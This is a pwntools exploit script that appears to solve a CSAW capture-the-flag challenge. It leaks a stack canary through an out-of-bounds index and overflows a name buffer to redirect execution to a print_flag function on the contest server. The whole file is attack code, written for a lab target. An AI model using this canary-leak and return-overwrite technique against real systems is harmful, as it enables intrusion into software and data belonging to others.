from pwn import *

# p = process("./unlimited_subway")
# gdb.attach(p)

p = remote("pwn.csaw.io", 7900)

offset = 0x40
print_flag = 0x08049304

canary_string = ""

i = 131
for _ in range(4):
    p.recvuntil(b"> ")
    p.sendline(b"V")
    p.recvuntil(b"Index :")
    p.sendline(f"{str(i)}".encode())
    leak = p.recvline().decode().strip()[-2:]
    canary_string += leak
    i -= 1

canary = int(canary_string,16)
log.info(f"{hex(canary)=}")

payload = b"A"*0x40 + p64(canary) + p64(print_flag)

p.recvuntil(b"> ")
p.sendline(b"E")
p.recvuntil(b"Name Size :")
p.sendline(b"100")
p.recvuntil(b"Name :")
p.sendline(payload)

p.interactive()

